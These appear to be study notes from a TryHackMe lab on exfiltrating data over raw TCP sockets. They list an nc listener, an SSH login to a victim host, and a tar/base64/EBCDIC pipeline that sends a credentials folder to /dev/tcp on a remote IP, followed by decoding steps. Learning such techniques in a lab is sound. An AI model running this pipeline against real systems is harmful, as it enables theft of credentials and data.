# Exfiltration using TCP socket

Exfiltration over TCP is unlikely to work, but try raw TCP sockets.

Using the TCP socket is one of the data exfiltration techniques that can be used in a non-secured environment 
where there are no network-based security products (to speak of, as far as we know). This kind of exfiltration 
is easy to detect because it relies on non-standard protocols. One of the benefits of this technique is that it 
encodes the data during transmission and makes it harder to examine.

`ssh` into the jump host:

    ssh thm@<IP jumphost>

Use the `nc` command to receive data on port 8080, store the data in the `/tmp/` directory and name it 
`task4-creds.data`:

    thm@jump-box$ nc -lvp 8080 > /tmp/task4-creds.data

Move on to the victim machine that contains the data (thm:tryhackme):

    thm@jump-box$ ssh thm@victim1.thm.com

Check the `creds.txt` file on the victim machine:

    thm@victim1:~$ cat task4/creds.txt

Exfiltrate data over TCP Socket:

    thm@victim1:$ tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080

* `tar zcf` - create a new archive file, using gzip to compress the selected folder.
* `base64` - encode the new compressed archive.
* `dd conv=ebcdic` - create and copy a backup file from it, using EBCDIC encoding.
* `> /dev/tcp/192.168.0.133/8080` - redirect the output to transfer it using the TCP socket on the specified IP and 
port.

Check the received data on the jumphost: 

    thm@jump-box$ nc -lvp 8080 > /tmp/task4-creds.data
    Listening on [0.0.0.0] (family 0, port 8080)
    Connection from 192.168.0.101 received!
    
    thm@jump-box$ ls -l /tmp/
    -rw-r--r-- 1 root root       240 Apr  8 11:37 task4-creds.data

Convert the received data back to its original state:

    thm@jump-box$ cd /tmp/
    thm@jump-box:/tmp/$ dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar

Unarchive `task4-creds.tar`:

    thm@jump-box$ tar xvf task4-creds.tar

Confirm the received data:
			
    thm@jump-box$ cat task4/creds.txt